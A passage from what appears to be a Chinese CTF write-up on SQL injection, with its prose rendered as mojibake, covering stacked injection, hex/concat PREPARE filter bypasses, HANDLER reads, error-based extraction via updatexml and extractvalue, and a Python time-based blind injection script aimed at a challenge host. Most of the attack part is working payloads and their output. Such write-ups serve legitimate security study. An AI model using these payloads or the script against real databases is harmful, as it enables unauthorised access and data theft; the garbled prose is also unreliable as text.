ä¸ºé¢˜ç›®çš„è¿‡æ»¤æ²¡æœ‰è¿‡æ»¤renameå’Œalter æ‰€ä»¥ç°åœ¨æƒ³æ³•æ˜¯æŠŠ1919810931114514æ”¹åæˆwords ç„¶åæŠŠåˆ—åflagæ”¹æˆid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; rename table <span class="built_in">words</span> <span class="keyword">to</span> words1; rename table `<span class="number">1919810931114514</span>` <span class="keyword">to</span> <span class="built_in">words</span>; alter table <span class="built_in">words</span> change flag <span class="built_in">id</span> varchar(<span class="number">100</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œrename table xx to xx æ˜¯ç»™æ•°æ®è¡¨æ”¹åçš„è¯­æ³• alter table æ˜¯åˆ‡æ¢åˆ°æ•°æ®è¡¨  change xx xx+ç±»å‹  ä¿®æ”¹æŸä¸ªå­—æ®µå<br>ç„¶åè¾“å…¥<code>1&#39; or 1=1 # </code> å°±å¯ä»¥æŸ¥åˆ°ç°åœ¨çš„wordsä¸‹é¢çš„å­—æ®µï¼Œå°±æ‹¿åˆ°flagäº†<br><img src="https://pic1.imgdb.cn/item/67f48da0e381c3632beed5b0.png"></p>
<h3 id="æ–¹æ³•2-åˆ©ç”¨ç¼–ç æˆ–concatç»•è¿‡è¿‡æ»¤"><a href="#æ–¹æ³•2-åˆ©ç”¨ç¼–ç æˆ–concatç»•è¿‡è¿‡æ»¤" class="headerlink" title="æ–¹æ³•2 åˆ©ç”¨ç¼–ç æˆ–concatç»•è¿‡è¿‡æ»¤"></a>æ–¹æ³•2 åˆ©ç”¨ç¼–ç æˆ–concatç»•è¿‡è¿‡æ»¤</h3><p>åœ¨é‡åˆ°å †å æ³¨å…¥æ—¶ï¼Œå¦‚æœselectã€renameã€alterå’Œhandlerç­‰è¯­å¥éƒ½è¢«è¿‡æ»¤çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨MySqlé¢„å¤„ç†è¯­å¥é…åˆconcatæ‹¼æ¥æ¥æ‰§è¡Œsqlè¯­å¥æ‹¿flagã€‚</p>
<p>PREPAREï¼šå‡†å¤‡ä¸€æ¡SQLè¯­å¥ï¼Œå¹¶åˆ†é…ç»™è¿™æ¡SQLè¯­å¥ä¸€ä¸ªåå­—ä¾›ä¹‹åè°ƒç”¨<br>EXECUTEï¼šæ‰§è¡Œå‘½ä»¤<br>DEALLOCATE PREPAREï¼šé‡Šæ”¾å‘½ä»¤<br>SETï¼šç”¨äºè®¾ç½®å˜é‡</p>
<p>ç°åœ¨æŠŠæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤è½¬æˆ16è¿›åˆ¶ç¬¦ select * from <code>1919810931114514</code>  -&gt; <code>0x73656c656374202a2066726f6d20603139313938313039333131313435313460</code><br>ç„¶ååˆ©ç”¨é¢„å¤„ç†è¯­å¥ <code>1&#39;; set @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare hello from @a;execute hello;#</code> ä½†æ˜¯ä¸èƒ½ç›´æ¥è¿™ä¹ˆç”¨ï¼Œå› ä¸ºåŸæ¥è¿‡æ»¤çš„åå•ä¸æ­¢ä¸Šé¢ç»™å‡ºçš„é‚£äº›<br><img src="https://pic1.imgdb.cn/item/67f48f7ce381c3632beed68b.png"><br>è¿™é‡Œå°±æ˜¯è¯´setå’Œprepareä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ ä¹Ÿèƒ½æ‹¿åˆ°flag æœ€åä¹Ÿæ˜¯ç”¨<code>1&#39; or 1=1#</code><br><code>1&#39;; Set @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;Prepare hello from @a;execute hello;#</code><br>é™¤äº†ç”¨åå…­è¿›åˆ¶ç¼–ç è¿˜å¯ä»¥ç”¨concatæ‹¼æ¥è¯­å¥ç»•è¿‡<br><code>1&#39;;set @a=concat(&quot;sel&quot;,&quot;ect flag from `1919810931114514`&quot;);prepare hello from @a;execute hello;#</code></p>
<h2 id="ä¾‹é¢˜2-buuctf-GYCTF2020-Blacklist"><a href="#ä¾‹é¢˜2-buuctf-GYCTF2020-Blacklist" class="headerlink" title="ä¾‹é¢˜2 buuctf[GYCTF2020]Blacklist"></a>ä¾‹é¢˜2 buuctf[GYCTF2020]Blacklist</h2><h3 id="åˆ©ç”¨handler-å¤„ç†"><a href="#åˆ©ç”¨handler-å¤„ç†" class="headerlink" title="åˆ©ç”¨handler å¤„ç†"></a>åˆ©ç”¨handler å¤„ç†</h3><p>è¿™é¢˜å’Œä¸Šé¢ä¸€é“ä¾‹é¢˜å¾ˆåƒï¼Œä½†æ˜¯è¿™é¢˜è¿‡æ»¤äº†renameå’Œalter<br><img src="https://pic1.imgdb.cn/item/67f49103e381c3632beed749.png"><br>æˆ‘ä»¬å­¦ä¹ ä¸€ä¸‹handler<br>HANDLER â€¦ OPEN è¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­ HANDLER â€¦ READ è¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨ HANDLER â€¦ CLOSE æˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­<br>ç„¶åå…ˆç”¨å †å æ³¨å…¥ï¼ŒæŸ¥ä¸€ä¸‹æ•°æ®åº“å’Œé‡Œé¢çš„æ•°æ®æ®µ å‘ç°flagåœ¨çš„æ•°æ®è¡¨åœ¨<code>FlagHere</code><br>ç°åœ¨ç”¨handlerè¯­å¥æŸ¥çœ‹é‡Œé¢çš„å†…å®¹<br><code>1&#39;;handler  FlagHere open;handler FlagHere read first;#</code><br><img src="https://pic1.imgdb.cn/item/67f49291e381c3632beed8b0.png"></p>
<h2 id="ä¾‹é¢˜3-buuctf-SWPU2019-Web4"><a href="#ä¾‹é¢˜3-buuctf-SWPU2019-Web4" class="headerlink" title="ä¾‹é¢˜3 buuctf[SWPU2019]Web4"></a>ä¾‹é¢˜3 buuctf[SWPU2019]Web4</h2><h3 id="å †å æ³¨å…¥-mysqlé¢„å¤„ç†-ç¼–ç ç»•è¿‡-æ—¶é—´ç›²æ³¨"><a href="#å †å æ³¨å…¥-mysqlé¢„å¤„ç†-ç¼–ç ç»•è¿‡-æ—¶é—´ç›²æ³¨" class="headerlink" title="å †å æ³¨å…¥+mysqlé¢„å¤„ç†+ç¼–ç ç»•è¿‡+æ—¶é—´ç›²æ³¨"></a>å †å æ³¨å…¥+mysqlé¢„å¤„ç†+ç¼–ç ç»•è¿‡+æ—¶é—´ç›²æ³¨</h3><p>å…ˆåˆ¤æ–­å‡ºæ˜¯ä¸€ä¸ªå †å æ³¨å…¥  ä½†æ˜¯ç›´æ¥åœ¨ç½‘é¡µä¸Šè¾“å…¥æ²¡æœ‰å›æ˜¾ï¼Œ ç”¨bpæŠ“åŒ…<br>ç„¶åè¾“å…¥; ä¹Ÿæ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨å †å æ³¨å…¥<br><img src="https://pic1.imgdb.cn/item/67f49536e381c3632beed9fb.png"><br>ä½†æ˜¯è¿™é‡Œçš„selectç­‰å¾ˆå¤šå…³é”®å­—éƒ½è¢«è¿‡æ»¤ï¼Œä½†æ˜¯æˆ‘ä»¬æŸ¥è¯¢åˆå¿…é¡»ç”¨åˆ°è¿™äº›ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿ<br>æˆ‘ä»¬å¯ä»¥ç”¨ä¸Šé¢è¯´åˆ°çš„mysqlä¸­çš„prepareè¯­å¥ï¼Œä»¥åŠç”¨åå…­è¿›åˆ¶ç¼–ç æ¥ç»•è¿‡ï¼Œå†ç”¨æ—¶é—´ç›²æ³¨æ¥åˆ¤æ–­æ˜¯å¦æ­£ç¡®<br>è¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œå‘é€æ•°æ®æ˜¯ç”¨jsonæ ¼å¼çš„<br>ç›´æ¥æ¥çœ‹è„šæœ¬å§</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://39ea5cde-01c9-4eea-af04-eae901e2bded.node5.buuoj.cn:81/index.php?r=Login/Index&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">&quot;admin&#x27;; set @a=0x&#123;0&#125;;prepare kakeru from @a;execute kakeru#&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(o)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> o <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">    payload = <span class="string">&quot;select if(ascii(substr(select flag from flag),&#123;0&#125;,1)=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>:payloads.<span class="built_in">format</span>(str_to_hex(payload.<span class="built_in">format</span>(i,j))),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">        data = json.dumps(data)</span><br><span class="line">        times = time.time()</span><br><span class="line">        res = requests.post(url = url,data = data)</span><br><span class="line">        <span class="keyword">if</span> (time.time() - times &gt;= <span class="number">3</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯wpä¸­éƒ½æ²¡æœ‰å†™æ€ä¹ˆçŸ¥é“flagè¡¨å’Œflagå­—æ®µçš„ï¼Œï¼Œä¸è¿‡ä¹Ÿä¸å½±å“å­¦ä¹ è€…é‡Œé¢çš„æ€æƒ³ã€‚</p>
<h2 id="ä¾‹é¢˜4-SUCTF-2019-EasySQL"><a href="#ä¾‹é¢˜4-SUCTF-2019-EasySQL" class="headerlink" title="ä¾‹é¢˜4 [SUCTF 2019]EasySQL"></a>ä¾‹é¢˜4 [SUCTF 2019]EasySQL</h2><h3 id="æ•°å­—å‹-å †å æ³¨å…¥-sql-mode"><a href="#æ•°å­—å‹-å †å æ³¨å…¥-sql-mode" class="headerlink" title="æ•°å­—å‹+å †å æ³¨å…¥+sql_mode"></a>æ•°å­—å‹+å †å æ³¨å…¥+sql_mode</h3><p>å…ˆè¾“å…¥1ï¼Œå¯ä»¥æŸ¥è¯¢åˆ°æ•°æ® è¾“å…¥1â€™æ²¡æœ‰è¿”å›ä¹Ÿæ²¡æœ‰æŠ¥é”™  è¯´æ˜æ˜¯æ•°å­—å‹æ³¨å…¥<br>å°è¯•ä¸€äº›å…³é”®å­—ä¹‹åå‘ç°è¿˜æ˜¯è¢«è¿‡æ»¤äº†å¾ˆå¤šï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤; å¯ä»¥å…ˆç”¨å †å æ³¨å…¥çœ‹æ•°æ®è¡¨ <code>1;show tables;#</code><br><img src="https://pic1.imgdb.cn/item/67f4e8b488c538a9b5c6471e.png"><br>ä½†æ˜¯æŸ¥è¯¢åˆ—åçš„ä¹‹åè¿˜æ˜¯è¢«è¿‡æ»¤ ï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨çŸ¥é“äº†æœ‰Flagè¡¨ï¼Œè€Œä¸”flagå¤§æ¦‚ç‡åœ¨flagå­—æ®µ<br>ä½†æ˜¯ç°åœ¨æœ‰è¿™ä¹ˆå¤šçš„è¿‡æ»¤ åº”è¯¥æ€ä¹ˆåŠï¼Ÿ  è¿™é‡Œç»è¿‡å°è¯•ï¼Œå¯ä»¥å‘ç°ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ åœ¨è¾“å…¥éé›¶æ•°å­—çš„æ—¶å€™æœ‰å›æ˜¾ï¼Œä½†æ˜¯è¾“å…¥0æ²¡æœ‰å›æ˜¾<br>çŒœæµ‹åˆ°åç«¯ç”¨åˆ°äº†orè¯­å¥æˆ–è€…æ˜¯|| è¾“å…¥éé›¶æ•°å­—å°±ä¼šç›´æ¥åˆ¤æ–­ä¸ºçœŸä¸ä¼šè¿›è¡Œ||åé¢çš„ä¸œè¥¿<br>å¦‚æœçŒœåˆ°äº†è¿™ä¸ªé€»è¾‘å°±å¯ä»¥ç”¨ <code>*,1</code> è¿™æ ·å°±æ˜¯select *,1|| â€¦ å°±ä¼šæŸ¥è¯¢Flagè¡¨é‡Œé¢çš„æ‰€æœ‰å†…å®¹<br><img src="https://pic1.imgdb.cn/item/67f4ecbe88c538a9b5c64a40.png"><br>æ–¹æ³•äºŒï¼š<br>é™¤äº†è¿™ä¸ªæ–¹æ³•è¿˜å¯ä»¥ç”¨sql_mode  å› ä¸ºè¿™é‡ŒçŸ¥é“äº†||è¯­å¥çš„ä½œç”¨æ˜¯é€»è¾‘åˆ¤æ–­ç¬¦ï¼Œä½†æ˜¯sqlä¸­||ä¹Ÿå¯ä»¥è¡¨ç¤ºå­—ç¬¦ä¸²çš„è¿æ¥<br>å¯ä»¥sql_mode&#x3D;PIPES_AS_CONCATï¼Œé€šè¿‡è¿™ä¸ªæ¨¡å¼ï¼Œsqlå°±çŸ¥é“||æ˜¯è¿æ¥ç¬¦ ç„¶åæˆ‘ä»¬åœ¨æŸ¥è¯¢å°±æ˜¯flagå‰é¢æ‹¼æ¥æˆ‘ä»¬æŸ¥è¯¢çš„ä¸œè¥¿<br>payload <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code><br><img src="https://pic1.imgdb.cn/item/67f4f30d88c538a9b5c65222.png"><br>å¯ä»¥çœ‹åˆ°è¿™é‡Œå°±æ˜¯åœ¨flagå‰é¢åŠ äº†ä¸€ä¸ª1</p>
<h1 id="åŸºäºæŠ¥é”™çš„sqlæ³¨å…¥"><a href="#åŸºäºæŠ¥é”™çš„sqlæ³¨å…¥" class="headerlink" title="åŸºäºæŠ¥é”™çš„sqlæ³¨å…¥"></a>åŸºäºæŠ¥é”™çš„sqlæ³¨å…¥</h1><p>é¦–å…ˆéœ€è¦å­¦ä¹ å‡ ä¸ªæŠ¥é”™æ³¨å…¥å¸¸ç”¨çš„å‡½æ•°</p>
<ol>
<li>updatexml</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">updatexml</span>(XML_document,XPath_string,new_value);</span><br></pre></td></tr></table></figure></div>
<p>æˆ‘ä»¬å¹¶ä¸éœ€è¦çŸ¥é“é‡Œé¢å‚æ•°çš„å…·ä½“å«ä¹‰ï¼Œæˆ‘ä»¬ç”¨åˆ°çš„æ˜¯ç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœè¾“å…¥concatå‡½æ•°è¿æ¥å­—ç¬¦ä¸²ï¼Œå°±ä¸ç¬¦åˆXPath_stringçš„æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™  ä¸€èˆ¬ç”¨<code>~</code>æŠŠç»“æœåŒ…è£¹èµ·æ¥ï¼Œä¾¿äºè¯†åˆ«<br>å¸¸ç”¨çš„åˆ©ç”¨è¯­å¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LISP"><figure class="iseeu highlight /lisp"><table><tr><td class="code"><pre><span class="line">and (<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> user()),<span class="number">0</span>x7e),<span class="number">1</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>
<p>0x7eå°±æ˜¯~ </p>
<ol start="2">
<li>extarctvalue<br>å’Œupdatexmlå·®ä¸å¤šï¼Œä½†æ˜¯åªæœ‰ä¸¤ä¸ªå‚æ•°</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LISP"><figure class="iseeu highlight /lisp"><table><tr><td class="code"><pre><span class="line">and (<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> user()),<span class="number">0</span>x7e),<span class="number">1</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>floor<br>å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå‘ä¸‹å–æ•´çš„å‡½æ•°</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> count(*),concat(<span class="keyword">user</span>(),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure></div>
<p>count(*) å‡½æ•°ï¼šè¿”å›è¡¨ä¸­çš„è®°å½•æ•°<br>æŠ¥é”™æ³¨å…¥ä¸­ï¼Œfloor(rand(0)*2)æŠ¥é”™æ˜¯æœ‰æ¡ä»¶çš„ï¼Œè®°å½•å¿…é¡»3æ¡ä»¥ä¸Šã€‚æ‰€ä»¥ä½¿ç”¨count(*) å‡½æ•°</p>
<p>ä½†æ˜¯ä¸Šé¢çš„updatexml å’Œ extarctvalueå‡½æ•°ä¸€æ¬¡åªèƒ½è¿”å›32ä½ç»“æœï¼Œæ‰€ä»¥è¦è·å¾—å®Œæ•´ç»“æœè¦ç”¨ä¸€äº›æˆªå–å‡½æ•°<br><img src="https://pic1.imgdb.cn/item/67f6474a88c538a9b5c7a49a.png"></p>
<h2 id="ä¾‹é¢˜-SWPUCTF-2021æ–°ç”Ÿèµ›-error"><a href="#ä¾‹é¢˜-SWPUCTF-2021æ–°ç”Ÿèµ›-error" class="headerlink" title="ä¾‹é¢˜ SWPUCTF_2021æ–°ç”Ÿèµ› error"></a>ä¾‹é¢˜ SWPUCTF_2021æ–°ç”Ÿèµ› error</h2><p><img src="https://pic1.imgdb.cn/item/67b002b5d0e0a243d4ff80fd.png"><br>è¾“å…¥ä¸€ä¸ªå€¼ä¹‹åä¼šè·³è½¬åˆ°<code>http://node7.anna.nssctf.cn:28229/index.php?id=-1</code>è€Œä¸”æœ‰å›æ˜¾</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">idï¼š1&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">You have an error in your SQ<span class="class">L syntax;</span><span class="built_in"> check </span>the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œé€šè¿‡æŠ¥é”™ä¿¡æ¯ï¼Œåˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥<br>ç„¶åå°è¯•<code>--+</code>å’Œ<code>#</code>å¾—å‡ºè¿™é‡Œç”¨çš„æ³¨é‡Šç¬¦æ˜¯<code>#</code><br>1.åˆ¤æ–­åˆ—æ•°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">idï¼š<span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ²¡æœ‰æç¤º...........</span><br><span class="line"></span><br><span class="line">idï¼š<span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Unknown column &#x27;<span class="number">4</span>&#x27; <span class="keyword">in</span> &#x27;<span class="keyword">order</span> <span class="title">clause</span>&#x27;</span><br></pre></td></tr></table></figure></div>
<p>2.çˆ†åº“å<br>è¿™é‡Œè¦æ ¹æ®æŠ¥é”™ä¿¡æ¯æ¥çš„å‡ºåº“åï¼Œå­¦ä¹ ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š<br><code>extractvalue (1,concat (0x7e,database ()))</code><br>EXTRACTVALUE() æ˜¯ MySQL çš„ä¸€ä¸ª XML å¤„ç†å‡½æ•°ï¼Œå®ƒç”¨äºä» XML æ•°æ®ä¸­æå–ç‰¹å®šçš„å€¼.ä½†å¦‚æœä¼ å…¥ é XML ç»“æ„ çš„ XPathï¼Œä¼šæŠ¥é”™ï¼Œå¹¶åœ¨é”™è¯¯ä¿¡æ¯ä¸­æ³„éœ²æ•°æ®.CONCAT() ç”¨äºæ‹¼æ¥å­—ç¬¦ä¸²ã€‚0x7e æ˜¯ åå…­è¿›åˆ¶çš„ ~ï¼ˆæ³¢æµªå·ï¼‰</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>ï¼š<span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database()))#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">XPATH</span> syntax error: &#x27;~test_db&#x27;</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°åº“åtest_dbã€‚<br>2.çˆ†è¡¨<br>åªè¦è®©æŠ¥é”™ä¿¡æ¯é‡Œé¢çˆ†å‡ºè¡¨åå°±å¯ä»¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>â€™ <span class="keyword">and</span> <span class="number">1</span>=extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database())))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line">æˆ–</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">idï¼š<span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database())))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~test_tb,users&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°è¡¨åtest_tb,users<br>3.çˆ†åˆ—å</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&#x27;test_tb&#x27;</span>)))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~id,flag&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>4.æŸ¥flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>ï¼š-<span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">0</span>x7e,(select group_concat(flag) from test_tb)) #</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">XPATH</span> syntax error: &#x27;&#123;ace8876e-<span class="number">87</span>f9-<span class="number">4526</span>-<span class="number">862</span>a-ff5d963&#x27;</span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯è¿™é‡Œé»˜è®¤åªè¿”å›äº†32ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬ç”¨substringå¾—åˆ°å®Œæ•´</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="built_in">extractvalue</span>(<span class="number">0x7e</span>,(<span class="built_in">select</span> <span class="built_in">substring</span>(<span class="built_in">group_concat</span>(flag),<span class="number">25</span>,<span class="number">32</span>) from test_tb)) <span class="meta">#</span></span><br><span class="line"></span><br><span class="line">idï¼š<span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="built_in">extractvalue</span>(<span class="number">0x7e</span>,(<span class="built_in">select</span> <span class="built_in">substring</span>(<span class="built_in">group_concat</span>(flag),<span class="number">25</span>,<span class="number">32</span>) from test_tb)) <span class="meta">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XPATH syntax <span class="built_in">error</span>: &#x27;a-ff5d9638a322&#125;&#x27;</span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥æ‹¼æ¥å‡ºå®Œæ•´flag<code>NSSCTF&#123;ace8876e-87f9-4526-862a-ff5d9638a322&#125;</code></p>
<h1 id="sqlæ³¨å…¥ç»•è¿‡"><a href="#sqlæ³¨å…¥ç»•è¿‡" class="headerlink" title="sqlæ³¨å…¥ç»•è¿‡"></a>sqlæ³¨å…¥ç»•è¿‡</h1><p>åœ¨sqlæ³¨å…¥é¢˜ç›®ä¸­ï¼Œå¤§å¤šæ•°çš„é¢˜ç›®éƒ½æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥æœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹å¸¸è§çš„ç»•è¿‡ï¼Œä¸€èˆ¬å°±æ˜¯ç”¨åŒæ ·åŠŸèƒ½çš„å­—ç¬¦æ¥æ›¿ä»£è¢«è¿‡æ»¤çš„å­—ç¬¦</p>
<ul>
<li>æ³¨é‡Š<br><code>--  #  /* */  </code></li>
<li>å¤§å°å†™<br>æœ‰äº›é¢˜çš„wafå¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œå¯ä»¥ç”¨å¤§å°å†™è¿‡æ»¤ï¼Œæ¯”å¦‚è¿‡æ»¤selectå¯ä»¥ç”¨SeLect</li>
<li>å†…è”æ³¨é‡Šç»•è¿‡<br>åœ¨mysqlä¸­å†…è”æ³¨é‡Šæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ³¨é‡Šæ–¹å¼ï¼Œè¯­æ³•ä¸º<code>/*!.../*</code> ä¸­é—´æœ‰ä¸€ä¸ªæ„Ÿå¹å· é‡Œé¢çš„è¯­å¥ä»…å¯¹ MySQL ç”Ÿæ•ˆçš„è¯­å¥æˆ–åŠŸèƒ½</li>
